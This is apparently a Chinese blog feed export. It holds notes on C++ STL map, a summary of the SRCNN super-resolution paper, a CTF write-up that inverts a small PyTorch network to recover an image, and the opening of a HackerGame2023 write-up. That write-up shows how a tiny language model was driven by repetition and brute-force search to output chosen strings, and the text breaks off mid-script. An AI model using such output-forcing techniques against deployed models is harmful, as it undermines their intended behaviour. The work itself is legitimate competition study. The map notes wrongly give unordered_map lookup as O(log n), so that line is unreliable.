<h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p><code>map</code> 是映射集合, 内部由<strong>红黑树</strong>实现, 在插入元素时会自动平衡树且帮你排序, <code>map</code> 与 <code>vector</code> 相比, 除了数据结构不同, 最大的不同点就是按值查询的复杂度不同, 由于 <code>map</code> 是根据平衡二叉树实现的, 所以单次查找的时间复杂度为 $O(logn)$,如果 <code>vector</code> 没有排序,那么 而 <code>vector</code> 单次查找要遍历数组, 时间复杂度为 $O(n)$ , 如果加上排序的话二分查找的时间复杂度就是 $O(logn)$, 所以其实 <code>vector</code> 在大部分情况下已经可以代替 <code>map</code> 的使用, <code>map</code> 在插入或者删除时还要 new 和 delete 一个映射, 所带来的时间开销也是显著的, <code>map</code> 一般用于数据量不大，且需要有序的访问键值对时使用.</p>
<p>在不要求顺序查找时可以使用 <code>unordered_map</code>, 能够在不排序的情况下有 $O(logn)$ 复杂度的查找.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; m;    <span class="comment">//定义 map, 前面是键名后面是键值</span></span><br><span class="line">m[<span class="number">1</span>] = <span class="number">100</span>; <span class="comment">//赋值</span></span><br><span class="line">m[<span class="number">1</span>] = <span class="number">200</span>; <span class="comment">//修改值</span></span><br><span class="line">m.<span class="built_in">count</span>(<span class="number">10</span>);    <span class="comment">//计数,复杂度为 logn</span></span><br><span class="line">m.<span class="built_in">find</span>(<span class="number">10</span>); <span class="comment">//返回该元素对应的迭代器,如果不存在返回 end()</span></span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><img src="/2023/11/20/Algorith-bases-and-STL/image-2.png"></p>
<p>使用 STL 的 <code>set</code> 容器去存储每一个字符串, 然后排序输出即可. 需要注意的是这里使用了 <code>sstream</code> 来读取字符流, <code>sstream</code> 可以将字符流中的字符以空格分开, 然后逐步赋值给其他变量.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">set&lt;string&gt; dict;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string s,buf;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;s)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isalpha</span>(s[i]))</span><br><span class="line">                s[i] = <span class="built_in">tolower</span>(s[i]);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                s[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">stringstream <span class="title">ss</span><span class="params">(s)</span></span>;</span><br><span class="line">        <span class="keyword">while</span>(ss&gt;&gt;buf)&#123;</span><br><span class="line">            dict.<span class="built_in">insert</span>(buf);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(string str:dict)&#123;</span><br><span class="line">            cout&lt;&lt;str&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>STL</tag>
      </tags>
  </entry>
  <entry>
    <title>【数字图像处理】 SRCNN 图像超分辨率</title>
    <url>/2023/12/15/DIP-SRCNN/</url>
    <content><![CDATA[<h1 id="使用深度卷积网络实现图像超分辨率"><a href="#使用深度卷积网络实现图像超分辨率" class="headerlink" title="使用深度卷积网络实现图像超分辨率"></a>使用深度卷积网络实现图像超分辨率</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>单图像超分辨率（SR）是从一张模糊的低分辨率图像创建出一张清晰的高分辨率图像的技术。这个过程在计算机视觉中既常见又复杂，因为低分辨率图像中的每个像素可以对应多种高分辨率版本。为解决这个问题，研究者们通常使用已知的信息来指导图像的高分辨率重建。</p>
<p>最新的一种方法是使用深度学习，特别是一种叫做超分辨率卷积神经网络（SRCNN）的技术。与传统方法不同，SRCNN不是通过学习和重复使用图像块的模式来提高分辨率，而是通过一个深度网络直接学习从低分辨率到高分辨率图像的转换。这个网络减少了需要的预处理和后处理步骤，并且能够在保持简单结构的同时，提供优于传统方法的图像质量。</p>
<p>SRCNN的另一个优势是它可以快速运行，即使是在普通的计算机CPU上也能实现实时处理。此外，随着训练数据集的扩大和模型结构的深化，SRCNN的性能还有进一步提升的潜力。它甚至可以同时处理彩色图像中的三个颜色通道，从而进一步提高图像的超分辨率效果。简而言之，SRCNN是一个更高效、更强大的图像超分辨率工具。</p>
<p>这篇论文的主要贡献有三个方面：</p>
<ol>
<li>提出了一个全卷积神经网络用于图像超分辨率。这个网络直接学习从低分辨率到高分辨率图像的端到端映射关系，除了优化过程之外几乎不需要任何预处理或后处理。</li>
<li>建立了基于深度学习的超分辨率方法与传统基于稀疏编码的超分辨率方法之间的关系。这一关系为网络结构的设计提供了指导。</li>
<li>展示了深度学习在经典的计算机视觉问题——图像超分辨率中的应用价值，能够实现良好的质量和速度。</li>
</ol>
<p><img src="/2023/12/15/DIP-SRCNN/fig1.png" alt="fig1"></p>
<p>图1展示了SRCNN如何在经过少量训练迭代后就超过了双三次插值（bicubic）这一基准方法，并在中等程度的训练后胜过了基于稀疏编码的方法（SC）</p>
<hr>
<p><img src="/2023/12/15/DIP-SRCNN/fig2.png" alt="fig2"></p>
<p>这四张图显示了不同超分辨率方法处理同一图像后的结果，其中每张图下方的dB值表示峰值信噪比（PSNR）的数值。PSNR是一种评估图像质量的指标，通常用于衡量原始图像与重建或压缩后图像之间的相似度。数值越高，表示误差越小，图像质量越好。这些dB值展示了每种方法重建的图像质量与原始图像的接近程度：</p>
<ul>
<li>原始图像&#x2F;PSNR：是原始高分辨率图像的参考标准，不显示dB值。</li>
<li>双三次插值&#x2F;Bicubic：24.04 dB，表示使用双三次插值方法后的图像质量评分。</li>
<li>基于稀疏编码的方法&#x2F;SC：25.58 dB，表示使用稀疏编码方法后的图像质量评分。</li>
<li>超分辨率卷积神经网络&#x2F;SRCNN：27.95 dB，表示使用SRCNN方法后的图像质量评分，是这些方法中最高的，表明SRCNN提供了最接近原始图像的重建效果。</li>
</ul>
<h2 id="相关知识介绍"><a href="#相关知识介绍" class="headerlink" title="相关知识介绍"></a>相关知识介绍</h2><p>超分辨率算法的分类介绍：</p>
<p>根据图像的先验特征(image piror)，我们对单图像使用的超分辨率算法(single image super-solution algorithm, SISR algorithm)可以分为四类，预测模型（prediction models）、基于边缘方法(method based methods)、基于块(基于实例)方法(patch based (or example based) methods)、图像统计方法(image statistical methods)。</p>
<p>-预测模型(prediciton model): 通过利用预定义的某种数学模型而不借助输入的图像数据训练去估计对应的高分辨率图像，从而完成超分辨率任务。例如，各类插值方法等。<br>-基于边缘方法（edge based model）: 基于图像边缘(edge)这一先验特征的学习而构造的算法。如基于梯度剖面(gradient profile)的学习方法(learning method)。<br>-基于块(基于实例)方法(patch based (or example based) methods):通过LR&#x2F;HR图像间子块(patch)的关系，利用加权平均[8，1]、核回归[6]、支持向量回归[7]等方法学习映射函数后完成超分<br> 辨率任务的算法。<br>-图像统计方法(image statistical methods):基于多种图像先验特征而构造的算法。</p>
<p>基于块(基于实例)方法分类介绍：</p>
<p>其中基于块(基于实例)方法可以分为两类，基于示例内部联系的方法(internal example based methods)和基于示例外部联系(external example based methods)的方法。</p>
<p>基于示例内部联系的方法利用图像内部的相似性，从输入图像中直接生成样本子块。最初是在Glasner的工作[5]中提出的，后续还提出了一些改进的变体[3]、[11]以加快处理速度。</p>
<p>基于示例外部联系的方法[1]、[2]则学习来自外部数据集的低&#x2F;高分辨率子块之间的映射关系。这些研究探讨了如何学习紧凑的字典或流形空间来关联低&#x2F;高分辨率子块，以及如何在这些空间中进行表示。在Freeman等人的先驱工作中[4]，字典直接呈现为低&#x2F;高分辨率子块对，然后在低分辨率空间中找到输入子块的最近邻（NN），并利用其对应的高分辨率子块进行重建。Chang等人[2]则引入了流形嵌入技术作为NN策略的替代方法。在杨等人的工作[12]、[13]中，上述NN对应关系演变成更复杂的稀疏编码公式。其他映射函数，如核回归、简单函数、随机森林和锚定邻域回归等等被提出以进一步提高映射的准确性和速度。基于稀疏编码的方法及其若干改进[9]、[10]如今处于最先进的超分辨率方法之列。在这些方法中，子块是优化的重点；子块提取和聚合步骤被视为前&#x2F;后处理并分别处理。</p>
<h2 id="用于超分辨率的卷积神经网络"><a href="#用于超分辨率的卷积神经网络" class="headerlink" title="用于超分辨率的卷积神经网络"></a>用于超分辨率的卷积神经网络</h2><h3 id="方程"><a href="#方程" class="headerlink" title="方程"></a>方程</h3><p>考虑一张单一的低分辨率图像，我们首先使用双三次插值将其放大到所需的尺寸，这是我们唯一进行的预处理步骤。让我们将插值后的图像表示为$ Y $。我们的目标是从$ Y $中恢复出一张图像 $ F(Y) $，尽可能地与真实的高分辨率图像 $ X $ 相似。为了方便说明，我们仍然将$ Y $称为“低分辨率”图像，尽管它与X具有相同的尺寸。我们希望学习一个映射 $ F $，它概念上包含三个操作：</p>
<p>-补丁提取与表示：该操作从低分辨率图像$ Y $中提取（重叠的）补丁，并将每个补丁表示为高维向量。这些向量构成一组特征图，其数量等于向量的维度。<br>-非线性映射：该操作将每个高维向量非线性映射到另一个高维向量。每个映射后的向量在概念上是高分辨率补丁的表示。这些向量构成另一组特征图。<br>-重构：该操作聚合上述高分辨率补丁的表示，生成最终的高分辨率图像。这个图像预期与真实的高分辨率图像 $ X $ 相似。</p>
<p>我们将展示所有这些操作构成了一个卷积神经网络。网络的概览如图2所示。接下来，我们j将说明每个操作的形式化定义。</p>
<p>步骤1：补丁提取与表示</p>
<p>用一组预先训练的基作为滤波器，对图像进行卷积，将此步操作记为$ F_1(Y) $。</p>
<p>具体来说：<br>$$<br>F_1(Y) &#x3D; \max(0, W1 * Y + B1)<br>$$</p>
<p>其中，$ W_1 $ 和 $ B_1 $ 分别代表滤波器和偏置，符号 ‘$ \ast $’ 表示卷积操作。这里的 $ W_1 $ 对应于支持尺寸为 $ c \times f_1 \times f_1 $ 的 $ n_1 $ 个滤波器，其中 $ c $ 是输入图像中的通道数，$ f_1 $ 是滤波器的空间尺寸。直观来说，$ W_1 $ 对图像应用了 $ n_1 $ 次卷积，每次卷积都有尺寸为 $ c \times f_1 \times f_1 $ 的核。输出由 $ n_1 $ 个特征图组成，$B_1$ 是一个 $ n_1 $ 维向量，其每个元素与一个滤波器相关联。最后，他们对滤波器的响应应用了ReLU激活函数。</p>
<p>步骤2：非线性映射</p>
<p>这段描述了非线性映射的过程。第一层从每个补丁中提取一个 $ n_1$ 维的特征。在第二个操作中，将这些 $n_1$ 维向量映射为一个 $ n_2 $ 维向量。这相当于应用了具有平凡空间支持 1×1 的 $ n_2 $个滤波器。这种解释仅适用于 1×1 的滤波器。但是可以很容易地推广到更大的滤波器，比如 3×3 或 5×5。在这种情况下，非线性映射不是作用在输入图像的一个补丁上；相反，它是作用在特征图的一个 3×3 或 5×5 的“补丁”上。第二层的操作是：</p>
<p>$$<br>F_2(Y) &#x3D; \max(0, W_2 * F_1(Y) + B_2)<br>$$</p>
<p>这里的 $ W_2 $ 包含尺寸为 $ n_1 \times f_2 \times f_2 $ 的 $ n_2 $ 个滤波器，$ B_2 $ 是 $ n_2 $ 维的。每个输出的 $ n_2 $ 维向量在概念上是一个高分辨率补丁的表示，将用于重建。</p>
<p>可以添加更多的卷积层来增加非线性。但这可能会增加模型的复杂性(一个层有 $n_2 \times f_2 \times f_2 \times n_2 $个参数)。</p>
<p>步骤3：重构</p>
<p>这一部分描述了重建的过程。传统方法中，预测出的重叠高分辨率补丁通常被平均以生成最终的完整图像。这种平均可以被视为一组特征图上的预定义滤波器（每个位置是高分辨率补丁的“展平”向量形式）。受此启发，他们定义了一个卷积层来生成最终的高分辨率图像：</p>
<p>$$<br>F(Y) &#x3D; W_3 * F_2(Y) + B_3<br>$$</p>
<p>这里的 $ W_3 $ 对应尺寸为 $ n_2 \times f_3 \times f3 $ 的 c 个滤波器，$ B_3 $ 是一个 $c$ 维的向量。</p>
<p>如果高分辨率补丁的表示是在图像域中（即，可以简单地重塑每个表示以形成补丁），我们期望这些滤波器像平均滤波器一样起作用；如果高分辨率补丁的表示在其他域中（例如，某些基的系数），我们期望 $W_3$ 的行为类似于先将系数投影到图像域，然后再进行平均。在任何情况下，$W_3$ 都是一组线性滤波器。</p>
<p><img src="/2023/12/15/DIP-SRCNN/fig4.png" alt="fig4"></p>
<p>以上为卷积神经网络图示</p>
<h3 id="和稀疏编码的关系"><a href="#和稀疏编码的关系" class="headerlink" title="和稀疏编码的关系"></a>和稀疏编码的关系</h3><p>基于稀疏编码的超分辨率（ SR） 方法可以看作是一个卷积神经网络。下图进行了详细说明</p>
<p><img src="/2023/12/15/DIP-SRCNN/fig3.png" alt="fig3"></p>
<ol>
<li>提取和表示补丁（Patch Extraction and Representation）：从输入图像中提取一个 $f_1 \times f_1$ 的低分辨率小方块。然后，稀疏编码解算器首先将方块投影到一个低分辨率字典上。这个“字典”是由很多标准化的小图块组成的，用来帮助我们理解和重构图片的内容。如果字典的大小是 $n_1$，这相当于在输入图像上应用 $n_1$ 个线性滤波器（$f_1 \times f_1$）。投影这个补丁到字典上，就好比是在原来的模糊图片上应用了 $n_1$ 个不同的滤镜，每个滤镜对应字典中的一个小块。每个滤镜都会尝试从你的补丁中找出最接近它的那部分内容。</li>
<li>非线性映射（Non-linear mapping）：稀疏编码解算器随后迭代处理这$n_1$个系数。这个解算器的输出是$n_2$个系数，通常情况下，$n_2 &#x3D; n_1$。这些$n_2$个系数代表了高分辨率补丁的表示。稀疏编码解算器在这里相当于一个特殊的“翻译器”，它把输入的图像块（在第一个步骤中得到的）转换为一组新的数值（称为系数），这些新数值代表了图像补丁在更高分辨率版本中的信息。这种转换是非线性的，意味着它能够捕捉输入数据之间复杂的关系，而不是简单的直线关系。参见图3中间部分。然而，这个稀疏编码解算器并不是一个简单的一步到位的过程（不是前馈的），它是通过多次迭代计算来逐渐接近最终结果的，这意味着它会不断地调整它的输出，直到找到最合适的高分辨率表示。相反，文中提到的非线性操作器是前馈的，意味着它可以一步到位地完成计算，不需要迭代，这使得过程更快、更高效。</li>
<li>然后将上述 $n_2$ 个系数（稀疏编码后）投影到另一个（高分辨率）字典上以生成高分辨率补丁。然后对重叠的高分辨率补丁进行平均。在图像重建的最后阶段，我们使用先前得到的 $n_2$个系数（这些系数代表了我们想要重建的高分辨率图像的特征）作为输入，对它们进行一种特殊的操作，称为线性卷积。线性卷积是图像处理中常用的一种技术，它通过一系列的滤波器来改变图像的特征，以此来重建或增强图像的质量。</li>
</ol>
<p>综上，基于稀疏编码的超分辨率方法可以看作是一种特殊的卷积神经网络，它包括了不同的非线性映射过程。但与传统的稀疏编码方法不同，作者提出的卷积神经网络将所有步骤（如字典创建、非线性映射、均值减法和平均化）集成到了一个待优化的系统中。这种方法实现了从头到尾的映射优化。</p>
<p>这样的类比还帮助我们在设计网络时设定超参数。比如，我们可以将网络最后一层的过滤器尺寸设置得比第一层小，这样可以让网络更加关注高分辨率图像的中心部分。同时，我们也可以减少某些层的神经元数量，因为我们期望网络表示更加稀疏。总体来说，这样的设置让重建的高分辨率像素能利用到比传统方法更多的像素的信息，也是该卷积神经网络能够提供更好性能的原因之一。</p>
<h3 id="训练过程"><a href="#训练过程" class="headerlink" title="训练过程"></a>训练过程</h3><p>为了学习端到端的映射函数$F$，我们需要估计网络参数$\Theta$，包括各层的权重$W_1, W_2, W_3$和偏置$B_1, B_2, B_3$。我们通过最小化重建图像$F(Y; \Theta)$和高分辨率真实图像$X$之间的差异来实现这一点。给定一组高分辨率图像${X_i}$及其相应的低分辨率图像${Y_i}$，我们使用均方误差（MSE）作为损失函数来评估这个差异：</p>
<p>$$<br>L(\Theta) &#x3D; \frac{1}{n} \sum_{i&#x3D;1}^{n} ||F(Y_i; \Theta) − X_i||^2，<br>$$</p>
<p>这里$n$是训练样本的数量。使用MSE有助于获得高的峰值信噪比（PSNR），这是评价图像恢复质量的一种常用指标。虽然我们的模型训练时倾向于高PSNR，但在使用其他指标，如SSIM和MSSIM评估时，仍表现良好。通过随机梯度下降和标准的反向传播来最小化损失。权重矩阵更新如下：</p>
<p>$$<br>\Delta_{i+1} &#x3D; 0.9 \cdot \Delta_i − \eta \cdot \left(\frac{\partial L}{\partial W_i}\right),<br>$$</p>
<p>$$<br>W_{i+1} &#x3D; W_i + \Delta_{i+1}，<br>$$</p>
<p>其中$i$是层和迭代的索引，$\eta$是学习率。每层的滤波器权重从一个均值为0，标准差为0.001的高斯分布中随机初始化（偏置为0）。前两层的学习率为$10^{-4}$，最后一层为$10^{-5}$。我们发现最后一层较小的学习率对网络收敛很重要。</p>
<h2 id="论文引用"><a href="#论文引用" class="headerlink" title="论文引用"></a>论文引用</h2><p>[1] Bevilacqua, M., Roumy, A., Guillemot, C., Morel, M.L.A.: Low-complexity single-image super-resolution based on nonnegative<br>neighbor embedding. In: British Machine Vision Conference<br>(2012)<br>[2] Chang, H., Yeung, D.Y., Xiong, Y.: Super-resolution through neighbor embedding. In: IEEE Conference on Computer Vision and<br>Pattern Recognition (2004)<br>[3] Freedman, G., Fattal, R.: Image and video upscaling from local<br>self-examples. ACM Transactions on Graphics 30(2), 12 (2011)<br>[4] Freeman, W.T., Jones, T.R., Pasztor, E.C.: Example-based super-resolution. Computer Graphics and Applications 22(2), 56–65<br>(2002)<br>[5] Glasner, D., Bagon, S., Irani, M.: Super-resolution from a single<br>image. In: IEEE International Conference on Computer Vision. pp.<br>349–356 (2009)<br>[6] He, K., Sun, J.: Convolutional neural networks at constrained time<br>cost. arXiv preprint arXiv:1412.1710 (2014)<br>[7] Jia, K., Wang, X., Tang, X.: Image transformation based on learning<br>dictionaries across image spaces. IEEE Transactions on Pattern<br>Analysis and Machine Intelligence 35(2), 367–380 (2013)<br>[8] Mamalet, F., Garcia, C.: Simplifying convnets for fast learning.<br>In: International Conference on Artificial Neural Networks, pp.<br>58–65. Springer (2012)<br>[9] Timofte, R., De Smet, V., Van Gool, L.: Anchored neighborhood<br>regression for fast example-based super-resolution. In: IEEE International Conference on Computer Vision. pp. 1920–1927 (2013)<br>[10] Timofte, R., De Smet, V., Van Gool, L.: A+: Adjusted anchored<br>neighborhood regression for fast super-resolution. In: IEEE Asian<br>Conference on Computer Vision (2014)<br>[11] Yang, C.Y., Huang, J.B., Yang, M.H.: Exploiting self-similarities<br>for single frame super-resolution. In: IEEE Asian Conference on<br>Computer Vision, pp. 497–510 (2010)<br>[12] Yang, J., Wright, J., Huang, T., Ma, Y.: Image super-resolution as<br>sparse representation of raw image patches. In: IEEE Conference<br>on Computer Vision and Pattern Recognition. pp. 1–8 (2008)<br>[13] Yang, J., Wright, J., Huang, T.S., Ma, Y.: Image super-resolution<br>via sparse representation. IEEE Transactions on Image Processing<br>19(11), 2861–2873 (2010)</p>
]]></content>
      <categories>
        <category>DIP</category>
      </categories>
      <tags>
        <tag>神经网络</tag>
        <tag>DIP</tag>
      </tags>
  </entry>
  <entry>
    <title>【HITCTF2023】 Network in network 神经网络图片恢复</title>
    <url>/2023/11/29/HITCTF-network-in-network/</url>
    <content><![CDATA[<h1 id="【HITCTF2023】-Network-in-network-神经网络图片恢复"><a href="#【HITCTF2023】-Network-in-network-神经网络图片恢复" class="headerlink" title="【HITCTF2023】 Network in network 神经网络图片恢复"></a>【HITCTF2023】 Network in network 神经网络图片恢复</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>拿到题目后, 有三个文件, 一个是模型源码, 一个是跑模型编码后的图片, 还有模型的 pt 参数文件.</p>
<p>源码为:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">file = Image.<span class="built_in">open</span>(<span class="string">&#x27;origin.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">m = trans(file)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0x2daa1a1</span>)</span><br><span class="line"></span><br><span class="line">net = nn.Sequential(</span><br><span class="line">    nn.Conv2d(<span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">5</span>, <span class="number">10</span>, <span class="number">5</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">    nn.Linear(<span class="number">317</span>, <span class="number">800</span>),</span><br><span class="line">    nn.Conv2d(<span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    nn.Sigmoid()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">torchvision.utils.save_image(net(m).squeeze(), <span class="string">&#x27;enc.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">torch.save(net, <span class="string">&#x27;net.pt&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>通过观察源码, 整个过程是经过一个卷积层变为 5 个通道数, 然后 Relu 非线性变化, 在经过一个卷积层变为 10 个通道数, 然后经过 Relu 与池化后经过一个全连接层, 再做卷积和 sigmoid 得到编码后的图片.</p>
<p>注意到整个过程会对图片产生影响的只有线性层 <code>nn.Linear</code> , 其他层由于 kernel 很小, 做特征值处理后能够肉眼识别出 flag. 所以这里考虑复原 <code>sigmoid</code>, <code>Conv2d</code>, <code>Linear</code>.</p>
<h3 id="sigmoid-复原"><a href="#sigmoid-复原" class="headerlink" title="sigmoid 复原"></a>sigmoid 复原</h3><p>sigmoid 函数</p>
<p>$$y &#x3D; \frac{1}{1 + e^{-x}}$$</p>
<p>逆运算，求得 $x$：</p>
<p>$$x &#x3D; -\ln\left(\frac{1}{y} - 1\right)$$</p>
<h3 id="卷积层复原"><a href="#卷积层复原" class="headerlink" title="卷积层复原"></a>卷积层复原</h3><p>卷积层的函数</p>
<p> $$Y_{i,j,k} &#x3D; \sum_{m&#x3D;1}^{C_{in}} W_{m,k} \cdot X_{i,j,m} + b_k$$</p>
<p>其中 $W$ 为每个通道的卷积核权重, $b_k$ 为每个通道的偏置</p>
<p>做复原, 仅需</p>
<p>$$X &#x3D; \frac{Y_{i,j,k}-b_k}{\sum_{m&#x3D;1}^{C_{in}} W_{m,k}}$$</p>
<h3 id="全连接层复原"><a href="#全连接层复原" class="headerlink" title="全连接层复原"></a>全连接层复原</h3><p>全连接层的函数</p>
<p>$$Y &#x3D; XW^T + b$$</p>
<p>复原</p>
<p>$$X &#x3D; \frac{Y-b}{W^T}$$</p>
<p>以上这些层的权重参数都可以从 <code>net.pt</code> 文件中提取出来, 使用 pytorch 的 <code>detach()</code> 函数, 图像复原代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载模型参数</span></span><br><span class="line">net = torch.load(<span class="string">&#x27;net.pt&#x27;</span>)</span><br><span class="line"><span class="comment"># 将图片转换为灰度图并将像素值归一化到 0~1</span></span><br><span class="line">image = np.array(Image.<span class="built_in">open</span>(<span class="string">&#x27;enc.png&#x27;</span>).convert(<span class="string">&#x27;L&#x27;</span>)) / <span class="number">255</span></span><br><span class="line"><span class="comment"># 转换为 pytorch 张量</span></span><br><span class="line">image =  torch.Tensor(image).reshape([<span class="number">1</span>, <span class="number">197</span>, <span class="number">800</span>])</span><br><span class="line"><span class="comment"># 获取卷积层的权重</span></span><br><span class="line">w_conv_sum = net[-<span class="number">2</span>].weight.detach().<span class="built_in">sum</span>()</span><br><span class="line">b_conv = net[-<span class="number">2</span>].bias.detach()</span><br><span class="line"><span class="comment"># 获取线性变化层的矩阵</span></span><br><span class="line">w_linear = net[-<span class="number">3</span>].weight.detach()</span><br><span class="line">b_linear = net[-<span class="number">3</span>].bias.detach()</span><br><span class="line"><span class="comment"># sigmoid 逆变换</span></span><br><span class="line">image = -torch.log((<span class="number">1</span>/image)-<span class="number">1</span>)</span><br><span class="line">recover_image = ((image-b_conv)/w_conv_sum - b_linear) @ w_linear.T.pinverse()</span><br><span class="line">plt.imshow(recover_image[<span class="number">0</span>,:,:],cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>复原后的效果为:</p>
<p><img src="/2023/11/29/HITCTF-network-in-network/image.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>神经网络</tag>
        <tag>图像恢复</tag>
      </tags>
  </entry>
  <entry>
    <title>【HackerGame2023】小型语言大模型星球 LLM Attack</title>
    <url>/2023/11/05/HackerGame2023-LLM/</url>
    <content><![CDATA[<h1 id="【HackerGame2023】小型语言大模型星球-LLM-Attack"><a href="#【HackerGame2023】小型语言大模型星球-LLM-Attack" class="headerlink" title="【HackerGame2023】小型语言大模型星球 LLM Attack"></a>【HackerGame2023】小型语言大模型星球 LLM Attack</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。</p>
<p>你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的 33M 参数的「小型大语言模型」控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。</p>
<p>在这个星球上，你需要与这个先进的语言模型展开一场交流。通过与它对话，诱导它说出指定的词语，从这个神秘智慧体中获得 flag。你需要让这个语言模型分别说出 <code>you are smart</code>，<code>accepted</code>，<code>hackergame</code> 和 <code>🐮</code>，以获得四个 flag.</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>这道题的 LLM 是一个仅有 33M 参数的 LLM,而且他并没有经过  Instruct Align, 他无法遵循人类的指令,导致我们无法与这个大模型对话,他只会根据我说的话填补故事内容,如</p>
<pre><code>Please say &quot;you are smart&quot;
</code></pre>
<p>他的回应是:</p>
<pre><code>and &quot;you are kind&quot;. The little girl smiled and said &quot;you are welcome&quot;.
The little girl was so happy that she had been able ...
</code></pre>
<h3 id="第一个-flag"><a href="#第一个-flag" class="headerlink" title="第一个 flag"></a>第一个 flag</h3><p>可以看成是一个补全模型, 对于 <code>you are smart</code>,仅需要大量重复让他去补全就可以了,所以构造对话为:</p>
<pre><code>you are smart you are smart you are smart you are smart you are smart 
</code></pre>
<p>能够获得第一个 flag:</p>
<p><img src="/2023/11/05/HackerGame2023-LLM/image.png"></p>
<h3 id="第二个-flag"><a href="#第二个-flag" class="headerlink" title="第二个 flag"></a>第二个 flag</h3><p>对于 <code>accepted</code> 官方给出的题解就是爆破(因为确定字符数小于 7 时能够让他说出来),这里贴一下官方的题解:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoModelForCausalLM, AutoTokenizer</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">model = AutoModelForCausalLM.from_pretrained(</span><br><span class="line">    <span class="string">&quot;roneneldan/TinyStories-33M&quot;</span>).<span class="built_in">eval</span>()</span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&quot;roneneldan/TinyStories-33M&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">message</span>):</span><br><span class="line">    model_inputs = tokenizer.encode(message, return_tensors=<span class="string">&quot;pt&quot;</span>)</span><br><span class="line">    model_outputs = model.generate(</span><br><span class="line">        model_inputs,</span><br><span class="line">        max_new_tokens=<span class="number">30</span>,</span><br><span class="line">        num_beams=<span class="number">1</span>,</span><br><span class="line">        pad_token_id=tokenizer.eos_token_id,</span><br><span class="line">    )</span><br><span class="line">    